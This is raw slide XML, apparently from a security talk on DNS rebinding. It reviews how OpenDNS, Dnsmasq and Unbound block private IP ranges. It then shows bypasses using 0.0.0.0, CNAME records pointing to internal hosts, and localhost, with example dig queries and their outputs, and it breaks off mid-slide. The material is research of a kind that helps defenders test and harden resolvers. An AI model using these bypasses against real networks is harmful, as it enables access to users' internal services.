            <a:r>
              <a:rPr lang="en"/>
              <a:t>OpenDNS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Cisco Umbrella</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Common recommendations and default configurations </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>do not provide complete protection</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="16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24" name="Shape 424"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425" name="Google Shape;425;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Common </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS Protections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426" name="Google Shape;426;p5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Approaches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Block RFC 1918 IP addresses</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Block localhost (127.0.0.0/8)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Block local (internal) networks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Block 0.0.0.0/8</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Tools:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Dnsmasq &amp; Unbound widely used</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>pfSense, OpenWRT, home routers (e.g. FRITZ!Box, ASUS)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Public DNS services</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>OpenDNS: “Block internal IP addresses”: Blocks RFC 1918 IP addresses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30" name="Shape 430"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431" name="Google Shape;431;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Dnsmasq</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="Google Shape;432;p5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2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>--stop-dns-rebind</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> : Reject private IP ranges</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>--rebind-localhost-ok</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> : Exempt 127.0.0.0/8 from rebinding checks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This blocks RFC1918 addresses, 0.0.0.0/8, and 127.0.0.0/8</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>not blocked</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="433" name="Google Shape;433;p58"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="2647950"/>
            <a:ext cx="5867400" cy="18288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37" name="Shape 437"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438" name="Google Shape;438;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Unbound</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="439" name="Google Shape;439;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="6872" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="514750" y="2180725"/>
            <a:ext cx="7762875" cy="2962775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440" name="Google Shape;440;p59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="8832300" cy="2218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latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>private-address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Configure specific internal IP address range to be blocked</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>locks RFC1918 IP addresses</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Does </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>not block</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>0.0.0.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>localhost</a:t>
            </a:r>
            <a:endParaRPr b="1"/>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44" name="Shape 444"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="445" name="Google Shape;445;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Rebinding Protection Bypass #1: 0.0.0.0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="446" name="Google Shape;446;p6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Wikipedia: “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>0.0.0.0 is a non-routable meta-address used to designate an invalid, unknown or non-applicable target”</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Fact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: 0.0.0.0 works well on Linux and macOS to access the localhost</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> protections that block DNS responses of 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Singularity returns a DNS A record: </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ dig s-1.2.3.4-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>0.0.0.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>-474794-fs-e.d.rebind.it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; QUESTION SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;s-1.2.3.4-0.0.0.0-474794-fs-e.d.rebind.it. IN A</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; ANSWER SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>s-1.2.3.4-0.0.0.0-474794-fs-e.d.rebind.it. 0 IN </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>A 0.0.0.0</a:t>
            </a:r>
            <a:endParaRPr b="1"/>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50" name="Shape 450"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451" name="Google Shape;451;p6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Rebinding Protection Bypass #2: CNAME</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452" name="Google Shape;452;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1096425"/>
            <a:ext cx="87285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if all internal IP addresses are blocked?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Canonical Name records (CNAME) map one domain name to another</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We return a CNAME DNS record instead of an internal IP address</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>w</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>iki.nccgroup.com or jenkins.internal.corp.com</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> protections that block DNS responses of private IP addresses</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The local, internal DNS server will then resolve the CNAM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>E</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dig s-1.2.3.4-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>wiki.nccgroup.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>-123-fs-e.d.rebind.it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; QUESTION SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;s-1.2.3.4-wiki.nccgroup.com-123-fs-e.d.rebind.it. IN A</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; ANSWER SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>s-1.2.3.4-wiki.nccgroup.com-123-fs-e.d.rebind.it. 9 IN </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1400">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CNAME wiki.nccgroup.com.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="14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56" name="Shape 456"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="457" name="Google Shape;457;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DNS Rebinding Protection Bypass #2a: localhost</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458" name="Google Shape;458;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="87285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localhost is a hostname that means this computer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We return a CNAME (Canonical Name) DNS record of “localhost.”</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
